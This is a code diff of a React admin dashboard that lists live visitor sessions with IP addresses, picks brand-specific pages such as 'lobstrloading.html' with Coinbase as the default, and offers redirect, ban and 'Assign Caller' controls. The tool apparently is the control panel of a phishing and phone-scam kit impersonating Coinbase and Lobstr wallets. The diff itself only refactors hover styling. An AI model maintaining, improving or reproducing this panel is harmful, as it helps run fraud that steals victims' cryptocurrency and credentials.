@@ -596,7 +596,7 @@ const SessionHeaderRow = () => {
 
 const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand, userRole, onAssignClick }) => {
   const { settings, callers, unassignSession } = useAdminSocket();
-  
+
   const getDefaultPage = (brand) => {
     switch(brand) {
       case 'Lobstr': return 'lobstrloading.html';
@@ -610,10 +610,9 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
       default: return 'loading.html'; // Coinbase default
     }
   };
-  
+
   const defaultPage = getDefaultPage(selectedBrand);
   const [selectedPage, setSelectedPage] = useState(session.currentPage || defaultPage || 'loading.html');
-  const [isHovered, setIsHovered] = useState(false);
 
   // Update selectedPage when brand changes
   useEffect(() => {
@@ -653,22 +652,20 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
   };
 
   return (
-    <div 
+    <div
       className={`
-        group relative px-6 py-4 
-        transition-all duration-500 
+        group relative px-6 py-4
+        transition-all duration-500
         ${isNew ? 'animate-highlight' : ''}
         hover:translate-y-[-1px]
         hover:shadow-[0_8px_16px_-6px_rgba(0,0,0,0.2)]
       `}
-      onMouseEnter={() => setIsHovered(true)}
-      onMouseLeave={() => setIsHovered(false)}
     >
-      <div className="absolute inset-0 bg-white/[0.01] backdrop-blur-sm" />
-      <div className={`absolute inset-0 bg-gradient-to-r from-blue-500/5 to-transparent
-                     transition-opacity duration-500 ${isHovered ? 'opacity-100' : 'opacity-0'}`} />
-      <div className={`absolute inset-0 bg-gradient-to-b from-white/[0.02] to-transparent
-                     transition-opacity duration-500 ${isHovered ? 'opacity-100' : 'opacity-0'}`} />
+      <div className="absolute inset-0 bg-white/[0.01] backdrop-blur-sm pointer-events-none" />
+      <div className="absolute inset-0 bg-gradient-to-r from-blue-500/5 to-transparent
+                     transition-opacity duration-500 opacity-0 group-hover:opacity-100 pointer-events-none" />
+      <div className="absolute inset-0 bg-gradient-to-b from-white/[0.02] to-transparent
+                     transition-opacity duration-500 opacity-0 group-hover:opacity-100 pointer-events-none" />
 
       <div className="relative grid grid-cols-12 gap-4 items-center">
         <div className="col-span-3">
@@ -679,10 +676,8 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
                   <SessionAlias sessionId={session.id} isDesktop={true} />
                 ) : (
                   <>
-                    <Monitor className={`
-                      w-4 h-4 text-white/40 transition-transform duration-300
-                      ${isHovered ? 'scale-110' : 'scale-100'}
-                    `} />
+                    <Monitor className="w-4 h-4 text-white/40 transition-transform duration-300
+                                      group-hover:scale-110" />
                     <span className="text-sm font-medium text-white/80">{session.id}</span>
                   </>
                 )}
@@ -707,8 +702,8 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
               )}
             </div>
             <div className="flex items-center space-x-2">
-              <MapPin className={`w-4 h-4 text-white/40 transition-transform duration-300 
-                                ${isHovered ? 'scale-110' : 'scale-100'}`} />
+              <MapPin className="w-4 h-4 text-white/40 transition-transform duration-300
+                               group-hover:scale-110" />
               <span className="text-sm text-white/60">{session.ip}</span>
             </div>
           </div>
@@ -747,8 +742,8 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
         </div>
 
         <div className="col-span-2 flex items-center justify-end space-x-1">
-          <div className={`absolute inset-0 rounded-lg transition-opacity duration-300
-                        ${isHovered ? 'opacity-100' : 'opacity-0'}`}>
+          <div className="absolute inset-0 rounded-lg transition-opacity duration-300
+                        opacity-0 group-hover:opacity-100 pointer-events-none">
             <div className="absolute inset-0 bg-white/[0.03] backdrop-blur-sm rounded-lg" />
             <div className="absolute inset-0 bg-gradient-to-r from-white/[0.02] to-transparent rounded-lg" />
           </div>
@@ -756,7 +751,7 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
           <CategorizedPageSelect
             selectedPage={selectedPage}
             onPageChange={setSelectedPage}
-            isHovered={isHovered}
+            isHovered={false}
             selectedBrand={selectedBrand}
           />
 
@@ -766,8 +761,8 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
                      hover:bg-white/[0.08] text-blue-400 hover:text-blue-300
                      backdrop-blur-sm shadow-lg shadow-black/5 active:scale-95`}
           >
-            <ExternalLink className={`w-4 h-4 transition-transform duration-300
-                                 ${isHovered ? 'scale-110' : 'scale-100'}`} />
+            <ExternalLink className="w-4 h-4 transition-transform duration-300
+                                    group-hover:scale-110" />
           </button>
 
           {userRole === 'admin' && (
@@ -778,8 +773,8 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
                          hover:bg-white/[0.08] text-orange-400 hover:text-orange-300
                          backdrop-blur-sm shadow-lg shadow-black/5 active:scale-95`}
               >
-                <Trash2 className={`w-4 h-4 transition-transform duration-300
-                                 ${isHovered ? 'scale-110' : 'scale-100'}`} />
+                <Trash2 className="w-4 h-4 transition-transform duration-300
+                                  group-hover:scale-110" />
               </button>
 
               <button
@@ -788,8 +783,8 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
                          hover:bg-white/[0.08] text-red-400 hover:text-red-300
                          backdrop-blur-sm shadow-lg shadow-black/5 active:scale-95`}
               >
-                <Ban className={`w-4 h-4 transition-transform duration-300
-                             ${isHovered ? 'scale-110' : 'scale-100'}`} />
+                <Ban className="w-4 h-4 transition-transform duration-300
+                              group-hover:scale-110" />
               </button>
 
               {/* Assignment controls */}
@@ -805,8 +800,8 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
                              backdrop-blur-sm shadow-lg shadow-black/5 active:scale-95`}
                     title="Unassign"
                   >
-                    <UserX className={`w-3.5 h-3.5 transition-transform duration-300
-                                     ${isHovered ? 'scale-110' : 'scale-100'}`} />
+                    <UserX className="w-3.5 h-3.5 transition-transform duration-300
+                                      group-hover:scale-110" />
                   </button>
                 </div>
               ) : (
@@ -817,8 +812,8 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
                            backdrop-blur-sm shadow-lg shadow-black/5 active:scale-95`}
                   title="Assign Caller"
                 >
-                  <UserPlus className={`w-3.5 h-3.5 transition-transform duration-300
-                                     ${isHovered ? 'scale-110' : 'scale-100'}`} />
+                  <UserPlus className="w-3.5 h-3.5 transition-transform duration-300
+                                       group-hover:scale-110" />
                 </button>
               )}
             </>
@@ -833,7 +828,6 @@ const SessionList = ({ userRole }) => {
   // Add settings to the destructured values from useAdminSocket
   const { sessions, banIP, redirectUser, removeSession, settings, callers, assignSession } = useAdminSocket();
   const { userRole: authUserRole, currentUser: currentUsername } = useAuth();
-  const [isHovered, setIsHovered] = useState(false);
   const [newSessions, setNewSessions] = useState(new Set());
   const [heartbeatTick, setHeartbeatTick] = useState(0);
   const [selectedBrand, setSelectedBrand] = useState(() => {
@@ -962,9 +956,7 @@ const SessionList = ({ userRole }) => {
 
   return (
     <div className="mt-6">
-      <div className="relative rounded-xl overflow-hidden bg-[#161A22] border border-gray-800/50"
-           onMouseEnter={() => setIsHovered(true)}
-           onMouseLeave={() => setIsHovered(false)}>
+      <div className="relative rounded-xl overflow-hidden bg-[#161A22] border border-gray-800/50">
 
         <div className="relative">
           <div className="px-6 py-4 border-b border-gray-800/50">
